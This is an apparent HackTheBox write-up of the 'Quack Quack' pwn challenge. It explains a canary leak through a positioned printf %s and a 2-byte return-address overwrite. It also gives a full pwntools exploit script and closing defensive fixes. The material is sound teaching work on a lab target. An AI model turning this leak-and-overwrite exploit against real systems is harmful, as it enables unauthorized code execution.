---
title: "Quack Quack"
date: 2027-01-15 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, stack-canary, format-string, partial-overwrite, ret2win, no-pie]
description: "A Very Easy Pwn challenge that chains two small primitives: a stack canary leaked through a positioned printf %s (reading past the canary's null low byte), then a 2-byte partial overwrite of the saved return address on a No-PIE binary to land directly inside an inline win function that prints the flag."
---

## Overview

`Quack Quack` is a Very Easy HackTheBox **Pwn** challenge. The binary is x86-64,
glibc 2.35, compiled with **Full RELRO, a stack canary, NX, and No PIE**. Despite
the protections, it leaks its own canary through a banner string and lets a tiny
overflow reach just two bytes into the saved return address — exactly enough, on a
No-PIE binary, to redirect execution into a built-in function that opens and prints
`./flag.txt`.

## The technique

Two primitives, chained:

1. **Canary leak via a positioned `printf("%s")`.** The input routine searches our
   buffer for the literal `"Quack Quack "` and then prints with
   `printf("Quack Quack %s, ready...", match + 0x20)` — a `%s` whose source pointer
   is decided by *where our marker string lands*. On x86-64 the stack canary's
   lowest byte is always `0x00`, so a `%s` reading up toward it from below stops at
   that null and reveals nothing. By placing the marker at the precise offset that
   makes `match + 0x20` point at `&canary + 1` (one byte past the null), the `%s`
   prints `canary[1..7]`, and we rebuild the full value as `b'\x00' + leaked`.

2. **2-byte partial overwrite of the return address.** The second read is just long
   enough to overflow the buffer into the first two bytes of the saved return
   address — so we control only its low 16 bits. Because the binary is No PIE, the
   normal return target (`0x40162a`, back in `main`) and the win function
   `duck_attack` (`0x40137f`) share their upper six bytes. Overwriting the low two
   bytes with `0x137f` sends `ret` straight into `duck_attack`, which prints the
   flag — no libc leak, no [ROP](https://cwe.mitre.org/data/definitions/787.html)
   chain.

The stack layout that makes the offsets concrete:

```
buf1   = rbp-0x80   read #1 = 102 bytes ; strstr(buf1,"Quack Quack ")
                    printf("Quack Quack %s, ready...", match+0x20)   <- leak
buf2   = rbp-0x60   read #2 = 106 bytes                              <- overflow
canary = rbp-0x08
saved rbp = rbp+0 ; return address = rbp+8  (normally -> main 0x40162a)
```

For the leak we want `match + 0x20 == rbp-0x7`, so `match == rbp-0x27`, which is
input offset `0x80 - 0x27 = 89`. For the overflow, the buffer-to-canary distance is
`0x60 - 0x8 = 88`, and read #2 of 106 bytes fits exactly:
`88 pad + 8 canary + 8 saved-rbp + 2 retaddr = 106`.

## Solution

The full exploit leaks the canary, then sends the partial-overwrite payload that
diverts the return into `duck_attack`. Run it as `python3 solve.py <host> <port>`.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, os
from pwn import *

BINDIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'files', 'challenge')
context.binary = ELF(os.path.join(BINDIR, 'quack_quack'), checksec=False)
context.log_level = 'info'

DUCK_ATTACK = 0x40137f  # win: open + print ./flag.txt

def conn():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process('./quack_quack', cwd=BINDIR)

io = conn()

# stage 1: leak the canary via positioned %s (skip the null LSB)
io.recvuntil(b'Quack the Duck!')
io.send(b'A' * 89 + b'Quack Quack ')          # match+0x20 == &canary+1
io.recvuntil(b'Quack Quack ')
leak = io.recvuntil(b', ready', drop=True)
canary = u64(b'\x00' + leak[:7])
log.success('canary = %#x', canary)

# stage 2: overflow with 2-byte partial overwrite of retaddr -> duck_attack
payload  = b'B' * 88
payload += p64(canary)
payload += b'C' * 8
payload += p16(DUCK_ATTACK & 0xffff)
assert len(payload) == 106
io.send(payload)

io.recvuntil(b'Did you really expect to win a fight against a Duck?!')
data = io.recvall(timeout=5)
print(data.decode(errors='replace'))
```

Running it leaks a fresh canary each connection and prints the flag:

```
[+] canary = 0x...e00
...
HTB{...}
```

## Why it worked

The `%s` sink turned attacker positioning into an arbitrary-ish read: by choosing
where the marker string lands, we chose *what memory the format string printed*.
The canary's null low byte — normally a defense against exactly this kind of leak —
becomes a known constant we simply prepend. With the canary in hand, the overflow
no longer trips `__stack_chk_fail`, and No PIE collapses "control the whole return
address" down to "control two bytes," which the short overflow supplies. This is a
classic [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html)
paired with an [information exposure](https://cwe.mitre.org/data/definitions/125.html)
read primitive.

## Fix / defense

- **Never print attacker-influenced pointers with `%s`.** Bound the format and don't
  let input choose where the argument pointer lands.
- **Bounds-check every `read`/copy** against the real buffer size — read #2 should
  never be able to reach the saved return address.
- **Enable PIE (`-fPIE -pie`).** Under ASLR, a 2-byte partial overwrite can no longer
  reliably reach a chosen function address.
- The stack canary here was wasted because the program handed it back; a leak-free
  design keeps `-fstack-protector-strong` actually meaningful.
